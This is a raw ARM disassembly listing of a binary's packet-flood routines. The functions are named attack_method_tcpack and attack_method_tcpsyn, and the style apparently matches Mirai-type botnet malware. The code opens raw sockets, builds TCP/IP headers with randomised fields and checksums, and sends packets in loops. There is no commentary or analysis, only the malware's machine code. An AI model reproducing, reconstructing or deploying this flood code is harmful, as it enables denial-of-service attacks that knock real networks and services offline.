    cce0:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    cce4:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    cce8:	e1a03820 	lsr	r3, r0, #16
    ccec:	e1a06824 	lsr	r6, r4, #16
    ccf0:	e1a01825 	lsr	r1, r5, #16
    ccf4:	e3570000 	cmp	r7, #0
    ccf8:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    ccfc:	e58d6058 	str	r6, [sp, #88]	; 0x58
    cd00:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    cd04:	e202b0ff 	and	fp, r2, #255	; 0xff
    cd08:	0a000092 	beq	cf58 <attack_method_tcpack+0x488>
    cd0c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    cd10:	e1a0e803 	lsl	lr, r3, #16
    cd14:	e1a03c06 	lsl	r3, r6, #24
    cd18:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    cd1c:	e1a02c01 	lsl	r2, r1, #24
    cd20:	e1a0140e 	lsl	r1, lr, #8
    cd24:	e1a01821 	lsr	r1, r1, #16
    cd28:	e1a00c20 	lsr	r0, r0, #24
    cd2c:	e206c0ff 	and	ip, r6, #255	; 0xff
    cd30:	e181ec2e 	orr	lr, r1, lr, lsr #24
    cd34:	e180c40c 	orr	ip, r0, ip, lsl #8
    cd38:	e28d0030 	add	r0, sp, #48	; 0x30
    cd3c:	e8900003 	ldm	r0, {r0, r1}
    cd40:	e1a03823 	lsr	r3, r3, #16
    cd44:	e1a02822 	lsr	r2, r2, #16
    cd48:	e2000001 	and	r0, r0, #1
    cd4c:	e2011001 	and	r1, r1, #1
    cd50:	e1836c24 	orr	r6, r3, r4, lsr #24
    cd54:	e1825c25 	orr	r5, r2, r5, lsr #24
    cd58:	e58d000c 	str	r0, [sp, #12]
    cd5c:	e58d1010 	str	r1, [sp, #16]
    cd60:	e28d2038 	add	r2, sp, #56	; 0x38
    cd64:	e892000c 	ldm	r2, {r2, r3}
    cd68:	e28d0040 	add	r0, sp, #64	; 0x40
    cd6c:	e8900003 	ldm	r0, {r0, r1}
    cd70:	e2022001 	and	r2, r2, #1
    cd74:	e2033001 	and	r3, r3, #1
    cd78:	e2000001 	and	r0, r0, #1
    cd7c:	e2011001 	and	r1, r1, #1
    cd80:	e58de064 	str	lr, [sp, #100]	; 0x64
    cd84:	e58dc008 	str	ip, [sp, #8]
    cd88:	e58d2014 	str	r2, [sp, #20]
    cd8c:	e58d3018 	str	r3, [sp, #24]
    cd90:	e58d001c 	str	r0, [sp, #28]
    cd94:	e58d1020 	str	r1, [sp, #32]
    cd98:	e3a04000 	mov	r4, #0
    cd9c:	e3a01001 	mov	r1, #1
    cda0:	e3a00080 	mov	r0, #128	; 0x80
    cda4:	eb0032c0 	bl	198ac <calloc>
    cda8:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    cdac:	e7890104 	str	r0, [r9, r4, lsl #2]
    cdb0:	e1a03282 	lsl	r3, r2, #5
    cdb4:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    cdb8:	e0433182 	sub	r3, r3, r2, lsl #3
    cdbc:	e0830008 	add	r0, r3, r8
    cdc0:	e5d43000 	ldrb	r3, [r4]
    cdc4:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    cdc8:	e3833040 	orr	r3, r3, #64	; 0x40
    cdcc:	e5c43000 	strb	r3, [r4]
    cdd0:	e5d42000 	ldrb	r2, [r4]
    cdd4:	e3c2200a 	bic	r2, r2, #10
    cdd8:	e3822005 	orr	r2, r2, #5
    cddc:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    cde0:	e5c42000 	strb	r2, [r4]
    cde4:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    cde8:	e5c41001 	strb	r1, [r4, #1]
    cdec:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    cdf0:	e3530000 	cmp	r3, #0
    cdf4:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    cdf8:	e5c42008 	strb	r2, [r4, #8]
    cdfc:	e1c430b2 	strh	r3, [r4, #2]
    ce00:	e3a03006 	mov	r3, #6
    ce04:	e59d1008 	ldr	r1, [sp, #8]
    ce08:	13a02040 	movne	r2, #64	; 0x40
    ce0c:	e5c43009 	strb	r3, [r4, #9]
    ce10:	11c420b6 	strhne	r2, [r4, #6]
    ce14:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    ce18:	e584200c 	str	r2, [r4, #12]
    ce1c:	e5903010 	ldr	r3, [r0, #16]
    ce20:	e1c410b4 	strh	r1, [r4, #4]
    ce24:	e5843010 	str	r3, [r4, #16]
    ce28:	e1c461b4 	strh	r6, [r4, #20]
    ce2c:	e2841014 	add	r1, r4, #20
    ce30:	e5d1300c 	ldrb	r3, [r1, #12]
    ce34:	e5d1200d 	ldrb	r2, [r1, #13]
    ce38:	e59d000c 	ldr	r0, [sp, #12]
    ce3c:	e3c33050 	bic	r3, r3, #80	; 0x50
    ce40:	e38330a0 	orr	r3, r3, #160	; 0xa0
    ce44:	e3c22020 	bic	r2, r2, #32
    ce48:	e5c1300c 	strb	r3, [r1, #12]
    ce4c:	e1822280 	orr	r2, r2, r0, lsl #5
    ce50:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    ce54:	e5c1200d 	strb	r2, [r1, #13]
    ce58:	e5813004 	str	r3, [r1, #4]
    ce5c:	e5d1300d 	ldrb	r3, [r1, #13]
    ce60:	e59d0010 	ldr	r0, [sp, #16]
    ce64:	e3c33010 	bic	r3, r3, #16
    ce68:	e1833200 	orr	r3, r3, r0, lsl #4
    ce6c:	e5c1300d 	strb	r3, [r1, #13]
    ce70:	e5d1200d 	ldrb	r2, [r1, #13]
    ce74:	e59d3014 	ldr	r3, [sp, #20]
    ce78:	e3c22008 	bic	r2, r2, #8
    ce7c:	e1822183 	orr	r2, r2, r3, lsl #3
    ce80:	e1c150b2 	strh	r5, [r1, #2]
    ce84:	e5c1200d 	strb	r2, [r1, #13]
    ce88:	e5d1300d 	ldrb	r3, [r1, #13]
    ce8c:	e59d0018 	ldr	r0, [sp, #24]
    ce90:	e3c33004 	bic	r3, r3, #4
    ce94:	e1833100 	orr	r3, r3, r0, lsl #2
    ce98:	e5c1300d 	strb	r3, [r1, #13]
    ce9c:	e5d1200d 	ldrb	r2, [r1, #13]
    cea0:	e59d301c 	ldr	r3, [sp, #28]
    cea4:	e3c22002 	bic	r2, r2, #2
    cea8:	e1822083 	orr	r2, r2, r3, lsl #1
    ceac:	e5c1200d 	strb	r2, [r1, #13]
    ceb0:	e5d1300d 	ldrb	r3, [r1, #13]
    ceb4:	e59d0020 	ldr	r0, [sp, #32]
    ceb8:	e3c33001 	bic	r3, r3, #1
    cebc:	e1803003 	orr	r3, r0, r3
    cec0:	e5c1300d 	strb	r3, [r1, #13]
    cec4:	e3a02004 	mov	r2, #4
    cec8:	e3a01002 	mov	r1, #2
    cecc:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    ced0:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    ced4:	eb001551 	bl	12420 <rand_next>
    ced8:	e200000f 	and	r0, r0, #15
    cedc:	e2800e57 	add	r0, r0, #1392	; 0x570
    cee0:	e2800008 	add	r0, r0, #8
    cee4:	e1a00800 	lsl	r0, r0, #16
    cee8:	e1a03420 	lsr	r3, r0, #8
    ceec:	e2033cff 	and	r3, r3, #65280	; 0xff00
    cef0:	e1833c20 	orr	r3, r3, r0, lsr #24
    cef4:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    cef8:	e3a03004 	mov	r3, #4
    cefc:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    cf00:	e3a0200a 	mov	r2, #10
    cf04:	e3a03008 	mov	r3, #8
    cf08:	e3a00002 	mov	r0, #2
    cf0c:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    cf10:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    cf14:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    cf18:	eb001540 	bl	12420 <rand_next>
    cf1c:	e3a02006 	mov	r2, #6
    cf20:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    cf24:	e3a01003 	mov	r1, #3
    cf28:	e3a03000 	mov	r3, #0
    cf2c:	e3a02001 	mov	r2, #1
    cf30:	e5840030 	str	r0, [r4, #48]	; 0x30
    cf34:	e5843034 	str	r3, [r4, #52]	; 0x34
    cf38:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    cf3c:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    cf40:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    cf44:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    cf48:	e0834002 	add	r4, r3, r2
    cf4c:	e1540007 	cmp	r4, r7
    cf50:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    cf54:	baffff90 	blt	cd9c <attack_method_tcpack+0x2cc>
    cf58:	e3a03000 	mov	r3, #0
    cf5c:	e3570000 	cmp	r7, #0
    cf60:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    cf64:	0afffffb 	beq	cf58 <attack_method_tcpack+0x488>
    cf68:	e1a00003 	mov	r0, r3
    cf6c:	e1a03280 	lsl	r3, r0, #5
    cf70:	e0433180 	sub	r3, r3, r0, lsl #3
    cf74:	e0833008 	add	r3, r3, r8
    cf78:	e5d32014 	ldrb	r2, [r3, #20]
    cf7c:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    cf80:	e352001f 	cmp	r2, #31
    cf84:	e2856014 	add	r6, r5, #20
    cf88:	9a00003b 	bls	d07c <attack_method_tcpack+0x5ac>
    cf8c:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    cf90:	e3730001 	cmn	r3, #1
    cf94:	0a000050 	beq	d0dc <attack_method_tcpack+0x60c>
    cf98:	e3a04801 	mov	r4, #65536	; 0x10000
    cf9c:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    cfa0:	e2444001 	sub	r4, r4, #1
    cfa4:	e1500004 	cmp	r0, r4
    cfa8:	0a000052 	beq	d0f8 <attack_method_tcpack+0x628>
    cfac:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    cfb0:	e1510004 	cmp	r1, r4
    cfb4:	0a000054 	beq	d10c <attack_method_tcpack+0x63c>
    cfb8:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    cfbc:	e1520004 	cmp	r2, r4
    cfc0:	0a000056 	beq	d120 <attack_method_tcpack+0x650>
    cfc4:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    cfc8:	e1530004 	cmp	r3, r4
    cfcc:	0a000058 	beq	d134 <attack_method_tcpack+0x664>
    cfd0:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    cfd4:	e1500004 	cmp	r0, r4
    cfd8:	0a00005a 	beq	d148 <attack_method_tcpack+0x678>
    cfdc:	e35b0000 	cmp	fp, #0
    cfe0:	1a00005c 	bne	d158 <attack_method_tcpack+0x688>
    cfe4:	e3a01000 	mov	r1, #0
    cfe8:	e1c510ba 	strh	r1, [r5, #10]
    cfec:	e1a00005 	mov	r0, r5
    cff0:	e3a01014 	mov	r1, #20
    cff4:	eb0005f0 	bl	e7bc <checksum_generic>
    cff8:	e3a02000 	mov	r2, #0
    cffc:	e1c500ba 	strh	r0, [r5, #10]
    d000:	e1a01006 	mov	r1, r6
    d004:	e1c621b0 	strh	r2, [r6, #16]
    d008:	e3a03028 	mov	r3, #40	; 0x28
    d00c:	e3a02b0a 	mov	r2, #10240	; 0x2800
    d010:	e1a00005 	mov	r0, r5
    d014:	eb0005fc 	bl	e80c <checksum_tcpudp>
    d018:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d01c:	e1a0e283 	lsl	lr, r3, #5
    d020:	e1c601b0 	strh	r0, [r6, #16]
    d024:	e04ee183 	sub	lr, lr, r3, lsl #3
    d028:	e1d660b2 	ldrh	r6, [r6, #2]
    d02c:	e08ee008 	add	lr, lr, r8
    d030:	e1ce60b2 	strh	r6, [lr, #2]
    d034:	e3a03901 	mov	r3, #16384	; 0x4000
    d038:	e3a0c010 	mov	ip, #16
    d03c:	e1a01005 	mov	r1, r5
    d040:	e1a0000a 	mov	r0, sl
    d044:	e3a0203c 	mov	r2, #60	; 0x3c
    d048:	e58de000 	str	lr, [sp]
    d04c:	e58dc004 	str	ip, [sp, #4]
    d050:	eb002eff 	bl	18c54 <__libc_sendto>
    d054:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d058:	e2830001 	add	r0, r3, #1
    d05c:	e1500007 	cmp	r0, r7
    d060:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    d064:	baffffc0 	blt	cf6c <attack_method_tcpack+0x49c>
    d068:	e3a03000 	mov	r3, #0
    d06c:	e3570000 	cmp	r7, #0
    d070:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    d074:	0affffb7 	beq	cf58 <attack_method_tcpack+0x488>
    d078:	eaffffba 	b	cf68 <attack_method_tcpack+0x498>
    d07c:	e5934010 	ldr	r4, [r3, #16]
    d080:	eb0014e6 	bl	12420 <rand_next>
    d084:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d088:	e1a01283 	lsl	r1, r3, #5
    d08c:	e0411183 	sub	r1, r1, r3, lsl #3
    d090:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    d094:	e1a02c24 	lsr	r2, r4, #24
    d098:	e182242c 	orr	r2, r2, ip, lsr #8
    d09c:	e0811008 	add	r1, r1, r8
    d0a0:	e2043cff 	and	r3, r4, #65280	; 0xff00
    d0a4:	e5d1c014 	ldrb	ip, [r1, #20]
    d0a8:	e1822403 	orr	r2, r2, r3, lsl #8
    d0ac:	e1822c04 	orr	r2, r2, r4, lsl #24
    d0b0:	e0822c30 	add	r2, r2, r0, lsr ip
    d0b4:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    d0b8:	e1a03c22 	lsr	r3, r2, #24
    d0bc:	e1833420 	orr	r3, r3, r0, lsr #8
    d0c0:	e2021cff 	and	r1, r2, #65280	; 0xff00
    d0c4:	e1833401 	orr	r3, r3, r1, lsl #8
    d0c8:	e1833c02 	orr	r3, r3, r2, lsl #24
    d0cc:	e5853010 	str	r3, [r5, #16]
    d0d0:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    d0d4:	e3730001 	cmn	r3, #1
    d0d8:	1affffae 	bne	cf98 <attack_method_tcpack+0x4c8>
    d0dc:	eb0014cf 	bl	12420 <rand_next>
    d0e0:	e3a04801 	mov	r4, #65536	; 0x10000
    d0e4:	e585000c 	str	r0, [r5, #12]
    d0e8:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    d0ec:	e2444001 	sub	r4, r4, #1
    d0f0:	e1500004 	cmp	r0, r4
    d0f4:	1affffac 	bne	cfac <attack_method_tcpack+0x4dc>
    d0f8:	eb0014c8 	bl	12420 <rand_next>
    d0fc:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    d100:	e1510004 	cmp	r1, r4
    d104:	e1c500b4 	strh	r0, [r5, #4]
    d108:	1affffaa 	bne	cfb8 <attack_method_tcpack+0x4e8>
    d10c:	eb0014c3 	bl	12420 <rand_next>
    d110:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    d114:	e1520004 	cmp	r2, r4
    d118:	e1c501b4 	strh	r0, [r5, #20]
    d11c:	1affffa8 	bne	cfc4 <attack_method_tcpack+0x4f4>
    d120:	eb0014be 	bl	12420 <rand_next>
    d124:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    d128:	e1530004 	cmp	r3, r4
    d12c:	e1c600b2 	strh	r0, [r6, #2]
    d130:	1affffa6 	bne	cfd0 <attack_method_tcpack+0x500>
    d134:	eb0014b9 	bl	12420 <rand_next>
    d138:	e5860004 	str	r0, [r6, #4]
    d13c:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    d140:	e1500004 	cmp	r0, r4
    d144:	1affffa4 	bne	cfdc <attack_method_tcpack+0x50c>
    d148:	eb0014b4 	bl	12420 <rand_next>
    d14c:	e35b0000 	cmp	fp, #0
    d150:	e5860008 	str	r0, [r6, #8]
    d154:	0affffa2 	beq	cfe4 <attack_method_tcpack+0x514>
    d158:	eb0014b0 	bl	12420 <rand_next>
    d15c:	e1c601b2 	strh	r0, [r6, #18]
    d160:	eaffff9f 	b	cfe4 <attack_method_tcpack+0x514>
    d164:	e1a0000a 	mov	r0, sl
    d168:	eb0038e0 	bl	1b4f0 <__GI___libc_close>
    d16c:	e28dd074 	add	sp, sp, #116	; 0x74
    d170:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d174:	e12fff1e 	bx	lr
    d178:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000d17c <attack_method_tcpsyn>:
    d17c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d180:	e1a08001 	mov	r8, r1
    d184:	e24dd074 	sub	sp, sp, #116	; 0x74
    d188:	e3a01004 	mov	r1, #4
    d18c:	e1a04002 	mov	r4, r2
    d190:	e1a05003 	mov	r5, r3
    d194:	e1a07000 	mov	r7, r0
    d198:	eb0031c3 	bl	198ac <calloc>
    d19c:	e1a01005 	mov	r1, r5
    d1a0:	e3a02002 	mov	r2, #2
    d1a4:	e3a03000 	mov	r3, #0
    d1a8:	e1a09000 	mov	r9, r0
    d1ac:	e1a00004 	mov	r0, r4
    d1b0:	ebfff4da 	bl	a520 <attack_get_opt_int>
    d1b4:	e3a03801 	mov	r3, #65536	; 0x10000
    d1b8:	e1a0c000 	mov	ip, r0
    d1bc:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d1c0:	e2433001 	sub	r3, r3, #1
    d1c4:	e3a02003 	mov	r2, #3
    d1c8:	e1a01005 	mov	r1, r5
    d1cc:	e1a00004 	mov	r0, r4
    d1d0:	e58dc048 	str	ip, [sp, #72]	; 0x48
    d1d4:	ebfff4d1 	bl	a520 <attack_get_opt_int>
    d1d8:	e1a01005 	mov	r1, r5
    d1dc:	e58d0024 	str	r0, [sp, #36]	; 0x24
    d1e0:	e3a02004 	mov	r2, #4
    d1e4:	e3a03040 	mov	r3, #64	; 0x40
    d1e8:	e1a00004 	mov	r0, r4
    d1ec:	ebfff4cb 	bl	a520 <attack_get_opt_int>
    d1f0:	e1a0c000 	mov	ip, r0
    d1f4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d1f8:	e1a01005 	mov	r1, r5
    d1fc:	e3a02005 	mov	r2, #5
    d200:	e3a03001 	mov	r3, #1
    d204:	e1a00004 	mov	r0, r4
    d208:	e58dc050 	str	ip, [sp, #80]	; 0x50
    d20c:	ebfff4c3 	bl	a520 <attack_get_opt_int>
    d210:	e3a03801 	mov	r3, #65536	; 0x10000
    d214:	e1a0c000 	mov	ip, r0
    d218:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d21c:	e2433001 	sub	r3, r3, #1
    d220:	e3a02006 	mov	r2, #6
    d224:	e1a01005 	mov	r1, r5
    d228:	e1a00004 	mov	r0, r4
    d22c:	e58dc054 	str	ip, [sp, #84]	; 0x54
    d230:	ebfff4ba 	bl	a520 <attack_get_opt_int>
    d234:	e3a03801 	mov	r3, #65536	; 0x10000
    d238:	e1a01005 	mov	r1, r5
    d23c:	e2433001 	sub	r3, r3, #1
    d240:	e3a02007 	mov	r2, #7
    d244:	e1a0b000 	mov	fp, r0
    d248:	e1a00004 	mov	r0, r4
    d24c:	ebfff4b3 	bl	a520 <attack_get_opt_int>
    d250:	e3a03801 	mov	r3, #65536	; 0x10000
    d254:	e1a01005 	mov	r1, r5
    d258:	e2433001 	sub	r3, r3, #1
    d25c:	e3a02011 	mov	r2, #17
    d260:	e1a06000 	mov	r6, r0
    d264:	e1a00004 	mov	r0, r4
    d268:	ebfff4ac 	bl	a520 <attack_get_opt_int>
    d26c:	e1a01005 	mov	r1, r5
    d270:	e58d0028 	str	r0, [sp, #40]	; 0x28
    d274:	e3a02012 	mov	r2, #18
    d278:	e3a03000 	mov	r3, #0
    d27c:	e1a00004 	mov	r0, r4
    d280:	ebfff4a6 	bl	a520 <attack_get_opt_int>
    d284:	e1a01005 	mov	r1, r5
    d288:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    d28c:	e3a0200b 	mov	r2, #11
    d290:	e3a03000 	mov	r3, #0
    d294:	e1a00004 	mov	r0, r4
    d298:	ebfff4a0 	bl	a520 <attack_get_opt_int>
    d29c:	e1a01005 	mov	r1, r5
    d2a0:	e58d0030 	str	r0, [sp, #48]	; 0x30
    d2a4:	e3a0200c 	mov	r2, #12
    d2a8:	e3a03000 	mov	r3, #0
    d2ac:	e1a00004 	mov	r0, r4
    d2b0:	ebfff49a 	bl	a520 <attack_get_opt_int>
    d2b4:	e1a01005 	mov	r1, r5
    d2b8:	e58d0034 	str	r0, [sp, #52]	; 0x34
    d2bc:	e3a0200d 	mov	r2, #13
    d2c0:	e3a03000 	mov	r3, #0
    d2c4:	e1a00004 	mov	r0, r4
    d2c8:	ebfff494 	bl	a520 <attack_get_opt_int>
    d2cc:	e1a01005 	mov	r1, r5
    d2d0:	e58d0038 	str	r0, [sp, #56]	; 0x38
    d2d4:	e3a0200e 	mov	r2, #14
    d2d8:	e3a03000 	mov	r3, #0
    d2dc:	e1a00004 	mov	r0, r4
    d2e0:	ebfff48e 	bl	a520 <attack_get_opt_int>
    d2e4:	e1a01005 	mov	r1, r5
    d2e8:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    d2ec:	e3a0200f 	mov	r2, #15
    d2f0:	e3a03001 	mov	r3, #1
    d2f4:	e1a00004 	mov	r0, r4
    d2f8:	ebfff488 	bl	a520 <attack_get_opt_int>
    d2fc:	e1a01005 	mov	r1, r5
    d300:	e58d0040 	str	r0, [sp, #64]	; 0x40
    d304:	e3a02010 	mov	r2, #16
    d308:	e3a03000 	mov	r3, #0
    d30c:	e1a00004 	mov	r0, r4
    d310:	ebfff482 	bl	a520 <attack_get_opt_int>
    d314:	e59f2508 	ldr	r2, [pc, #1288]	; d824 <attack_method_tcpsyn+0x6a8>
    d318:	e58d0044 	str	r0, [sp, #68]	; 0x44
    d31c:	e5923000 	ldr	r3, [r2]
    d320:	e1a01005 	mov	r1, r5
    d324:	e3a02019 	mov	r2, #25
    d328:	e1a00004 	mov	r0, r4
    d32c:	ebfff460 	bl	a4b4 <attack_get_opt_ip>
    d330:	e3a01003 	mov	r1, #3
    d334:	e58d0060 	str	r0, [sp, #96]	; 0x60
    d338:	e3a02006 	mov	r2, #6
    d33c:	e3a00002 	mov	r0, #2
    d340:	eb002e77 	bl	18d24 <__GI_socket>
    d344:	e3700001 	cmn	r0, #1
    d348:	e1a0a000 	mov	sl, r0
    d34c:	0a000131 	beq	d818 <attack_method_tcpsyn+0x69c>
    d350:	e28d3070 	add	r3, sp, #112	; 0x70
    d354:	e3a02001 	mov	r2, #1
    d358:	e5232004 	str	r2, [r3, #-4]!
    d35c:	e3a0c004 	mov	ip, #4
    d360:	e3a01000 	mov	r1, #0
    d364:	e2822002 	add	r2, r2, #2
    d368:	e58dc000 	str	ip, [sp]
    d36c:	eb002e5a 	bl	18cdc <__GI_setsockopt>
    d370:	e3700001 	cmn	r0, #1
    d374:	0a000125 	beq	d810 <attack_method_tcpsyn+0x694>
    d378:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    d37c:	e3a02000 	mov	r2, #0
    d380:	e1a00801 	lsl	r0, r1, #16
    d384:	e1a0480b 	lsl	r4, fp, #16
    d388:	e1a05806 	lsl	r5, r6, #16
    d38c:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    d390:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    d394:	e1a03820 	lsr	r3, r0, #16
    d398:	e1a06824 	lsr	r6, r4, #16
    d39c:	e1a01825 	lsr	r1, r5, #16
    d3a0:	e3570000 	cmp	r7, #0
    d3a4:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    d3a8:	e58d6058 	str	r6, [sp, #88]	; 0x58
    d3ac:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    d3b0:	e202b0ff 	and	fp, r2, #255	; 0xff
    d3b4:	0a000092 	beq	d604 <attack_method_tcpsyn+0x488>
    d3b8:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    d3bc:	e1a0e803 	lsl	lr, r3, #16
    d3c0:	e1a03c06 	lsl	r3, r6, #24
    d3c4:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    d3c8:	e1a02c01 	lsl	r2, r1, #24
    d3cc:	e1a0140e 	lsl	r1, lr, #8
    d3d0:	e1a01821 	lsr	r1, r1, #16
    d3d4:	e1a00c20 	lsr	r0, r0, #24
    d3d8:	e206c0ff 	and	ip, r6, #255	; 0xff
    d3dc:	e181ec2e 	orr	lr, r1, lr, lsr #24
    d3e0:	e180c40c 	orr	ip, r0, ip, lsl #8
    d3e4:	e28d0030 	add	r0, sp, #48	; 0x30
    d3e8:	e8900003 	ldm	r0, {r0, r1}
    d3ec:	e1a03823 	lsr	r3, r3, #16
    d3f0:	e1a02822 	lsr	r2, r2, #16
    d3f4:	e2000001 	and	r0, r0, #1
    d3f8:	e2011001 	and	r1, r1, #1
    d3fc:	e1836c24 	orr	r6, r3, r4, lsr #24
    d400:	e1825c25 	orr	r5, r2, r5, lsr #24
    d404:	e58d000c 	str	r0, [sp, #12]
    d408:	e58d1010 	str	r1, [sp, #16]
    d40c:	e28d2038 	add	r2, sp, #56	; 0x38
    d410:	e892000c 	ldm	r2, {r2, r3}
    d414:	e28d0040 	add	r0, sp, #64	; 0x40
    d418:	e8900003 	ldm	r0, {r0, r1}
    d41c:	e2022001 	and	r2, r2, #1
    d420:	e2033001 	and	r3, r3, #1
    d424:	e2000001 	and	r0, r0, #1
    d428:	e2011001 	and	r1, r1, #1
    d42c:	e58de064 	str	lr, [sp, #100]	; 0x64
    d430:	e58dc008 	str	ip, [sp, #8]
    d434:	e58d2014 	str	r2, [sp, #20]
    d438:	e58d3018 	str	r3, [sp, #24]
    d43c:	e58d001c 	str	r0, [sp, #28]
    d440:	e58d1020 	str	r1, [sp, #32]
    d444:	e3a04000 	mov	r4, #0
    d448:	e3a01001 	mov	r1, #1
    d44c:	e3a00080 	mov	r0, #128	; 0x80
    d450:	eb003115 	bl	198ac <calloc>
    d454:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    d458:	e7890104 	str	r0, [r9, r4, lsl #2]
    d45c:	e1a03282 	lsl	r3, r2, #5
    d460:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    d464:	e0433182 	sub	r3, r3, r2, lsl #3
    d468:	e0830008 	add	r0, r3, r8
    d46c:	e5d43000 	ldrb	r3, [r4]
    d470:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    d474:	e3833040 	orr	r3, r3, #64	; 0x40
    d478:	e5c43000 	strb	r3, [r4]
    d47c:	e5d42000 	ldrb	r2, [r4]
    d480:	e3c2200a 	bic	r2, r2, #10
    d484:	e3822005 	orr	r2, r2, #5
    d488:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    d48c:	e5c42000 	strb	r2, [r4]
    d490:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    d494:	e5c41001 	strb	r1, [r4, #1]
    d498:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    d49c:	e3530000 	cmp	r3, #0
    d4a0:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    d4a4:	e5c42008 	strb	r2, [r4, #8]
    d4a8:	e1c430b2 	strh	r3, [r4, #2]
    d4ac:	e3a03006 	mov	r3, #6
    d4b0:	e59d1008 	ldr	r1, [sp, #8]
    d4b4:	13a02040 	movne	r2, #64	; 0x40
    d4b8:	e5c43009 	strb	r3, [r4, #9]
    d4bc:	11c420b6 	strhne	r2, [r4, #6]
    d4c0:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    d4c4:	e584200c 	str	r2, [r4, #12]
    d4c8:	e5903010 	ldr	r3, [r0, #16]
    d4cc:	e1c410b4 	strh	r1, [r4, #4]
    d4d0:	e5843010 	str	r3, [r4, #16]
    d4d4:	e1c461b4 	strh	r6, [r4, #20]
    d4d8:	e2841014 	add	r1, r4, #20
    d4dc:	e5d1300c 	ldrb	r3, [r1, #12]
    d4e0:	e5d1200d 	ldrb	r2, [r1, #13]
    d4e4:	e59d000c 	ldr	r0, [sp, #12]
    d4e8:	e3c33050 	bic	r3, r3, #80	; 0x50
    d4ec:	e38330a0 	orr	r3, r3, #160	; 0xa0
    d4f0:	e3c22020 	bic	r2, r2, #32
    d4f4:	e5c1300c 	strb	r3, [r1, #12]
    d4f8:	e1822280 	orr	r2, r2, r0, lsl #5
    d4fc:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    d500:	e5c1200d 	strb	r2, [r1, #13]
    d504:	e5813004 	str	r3, [r1, #4]
    d508:	e5d1300d 	ldrb	r3, [r1, #13]
    d50c:	e59d0010 	ldr	r0, [sp, #16]
    d510:	e3c33010 	bic	r3, r3, #16
    d514:	e1833200 	orr	r3, r3, r0, lsl #4
    d518:	e5c1300d 	strb	r3, [r1, #13]
    d51c:	e5d1200d 	ldrb	r2, [r1, #13]
    d520:	e59d3014 	ldr	r3, [sp, #20]
    d524:	e3c22008 	bic	r2, r2, #8
    d528:	e1822183 	orr	r2, r2, r3, lsl #3
    d52c:	e1c150b2 	strh	r5, [r1, #2]
    d530:	e5c1200d 	strb	r2, [r1, #13]
    d534:	e5d1300d 	ldrb	r3, [r1, #13]
    d538:	e59d0018 	ldr	r0, [sp, #24]
    d53c:	e3c33004 	bic	r3, r3, #4
    d540:	e1833100 	orr	r3, r3, r0, lsl #2
    d544:	e5c1300d 	strb	r3, [r1, #13]
